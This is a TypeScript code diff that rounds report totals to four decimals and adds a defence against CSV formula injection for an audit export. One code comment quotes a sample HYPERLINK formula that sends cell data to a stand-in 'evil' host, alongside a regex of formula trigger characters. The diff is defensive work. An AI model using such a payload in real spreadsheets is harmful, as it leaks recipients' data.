@@ -50,6 +50,29 @@ export function toNum(v: string | null | undefined): number {
   return Number.isFinite(n) ? n : 0
 }
 
+/**
+ * 把加總結果收斂回 4 位小數，消除浮點累加的尾數雜訊。
+ *
+ * 後端兩個數值欄位都是 `numeric(18,4)`（002_schema.sql:5252-5253），**來源只有
+ * 4 位小數**。用 IEEE-754 累加會冒出 `1234.5678000000001` 這種尾巴——畫面上被
+ * `formatNumber(v, 2)` 蓋掉看不出來，但 **CSV 寫的是原始數字**，那份檔案是要
+ * 寄給稽核的。
+ *
+ * 為什麼不引進 decimal.js 之類的精確十進位套件（審查建議的做法）：
+ *
+ * 1. 新增依賴在本專案是 §必問 的事，不是實作者能自己決定的。
+ * 2. 這裡不需要。float64 的精確整數範圍是 2^53 ≈ 9×10^15，換算成 4 位小數是
+ *    約 9×10^11；本報表的量級（數千筆 × 萬元級）離它有五個數量級以上。
+ *    在這個範圍內，「浮點累加後捨入到 4 位」與「精確十進位加總」結果相同。
+ * 3. 真正需要精確十進位的是**寫入端**（下單、扣帳），那些全部在後端用
+ *    `rust_decimal` 處理，本模組只做唯讀呈現。
+ *
+ * ⚠️ 若日後量級成長到接近 9×10^11，這個假設就不成立了，屆時要改用精確型別。
+ */
+export function round4(n: number): number {
+  return Math.round(n * 1e4) / 1e4
+}
+
 /** 一個案件的彙總（跨品項）。注意沒有數量欄位，理由見檔頭。 */
 export interface ProtocolTotal {
   protocol_id: string
@@ -125,7 +148,7 @@ export function aggregateByProtocol(rows: ProtocolConsumptionReport[]): Protocol
         protocol_title: head.protocol_title,
         product_count: group.length,
         doc_count: docCountLowerBound(group),
-        total_cost: group.reduce((sum, r) => sum + toNum(r.total_cost), 0),
+        total_cost: round4(group.reduce((sum, r) => sum + toNum(r.total_cost), 0)),
         first_trx_date: group.reduce(
           (min, r) => (r.first_trx_date < min ? r.first_trx_date : min),
           head.first_trx_date
@@ -157,8 +180,8 @@ export function aggregateByProduct(rows: ProtocolConsumptionReport[]): ProductTo
         category_name: head.category_name,
         base_uom: head.base_uom,
         protocol_count: new Set(group.map(r => r.protocol_id)).size,
-        qty_base: group.reduce((sum, r) => sum + toNum(r.qty_base), 0),
-        total_cost: group.reduce((sum, r) => sum + toNum(r.total_cost), 0),
+        qty_base: round4(group.reduce((sum, r) => sum + toNum(r.qty_base), 0)),
+        total_cost: round4(group.reduce((sum, r) => sum + toNum(r.total_cost), 0)),
       }
     })
     .sort((a, b) => a.product_sku.localeCompare(b.product_sku))
@@ -170,6 +193,8 @@ export function buildCrossTab(rows: ProtocolConsumptionReport[]): CrossTab {
     const key = cellKey(row.protocol_id, row.product_id)
     cells.set(key, (cells.get(key) ?? 0) + toNum(row.qty_base))
   }
+  // 累加完再一次收斂，避免逐步捨入
+  for (const [k, v] of cells) cells.set(k, round4(v))
 
   return {
     protocols: aggregateByProtocol(rows).map(p => ({
@@ -238,7 +263,42 @@ const CRLF = '\r\n'
  * - **record 之間用 CRLF**（§2.1）。用 `\n` 的話註解宣稱的 RFC 4180 就是假的，
  *   而且部分試算表與匯入工具只認 CRLF。
  */
+/**
+ * 會被試算表當成公式起頭的字元。
+ *
+ * `-` 也在內：`-1+1` 這種看起來像負數的東西，Excel 一樣當公式算。
+ * Tab 與 CR 本身也是觸發字元（某些解析器據此換欄／換列）。
+ */
+const FORMULA_TRIGGERS = /^[=+\-@\t\r]/
+
+/**
+ * 阻擋 CSV 公式注入（OWASP: CSV Injection / Formula Injection）。
+ *
+ * 🔴 **RFC 4180 的引號跳脫擋不住這件事。** 引號只保證欄位不會被切錯；
+ * Excel／LibreOffice 開檔時會先剝掉引號，再看到 `=`、`+`、`-`、`@` 開頭就當公式執行。
+ *
+ * 這支報表的風險是實的，不是理論：`product_name`、`product_sku`、`protocol_title`
+ * 都由建檔的人自由輸入，而這份 CSV 的設計用途正是**寄給 IACUC 稽核用 Excel 開啟**。
+ * 有人把品項命名成 `=HYPERLINK("http://evil/?"&A1,"click")`，收件者一開就中。
+ *
+ * 緩解方式是前面加一個單引號讓試算表當純文字。前置空白不能當免死金牌——
+ * Excel 會忽略它再解讀後面的內容，所以要跳過空白之後再判斷一次。
+ *
+ * ⚠️ 只處理字串。數值欄位維持數值型別，否則負數金額會被前置引號變成文字，
+ * 下游拿去加總就壞了。
+ */
+export function neutralizeFormula(cell: string): string {
+  const withoutLeadingSpaces = cell.replace(/^[ \u00a0]+/, '')
+  if (FORMULA_TRIGGERS.test(cell) || FORMULA_TRIGGERS.test(withoutLeadingSpaces)) {
+    return `'${cell}`
+  }
+  return cell
+}
+
 export function toCsv(headers: string[], rows: Array<Array<string | number>>): string {
-  const quote = (cell: string | number) => `"${String(cell).replace(/"/g, '""')}"`
+  const quote = (cell: string | number) => {
+    const safe = typeof cell === 'string' ? neutralizeFormula(cell) : String(cell)
+    return `"${safe.replace(/"/g, '""')}"`
+  }
   return [headers, ...rows].map(row => row.map(quote).join(',')).join(CRLF)
 }
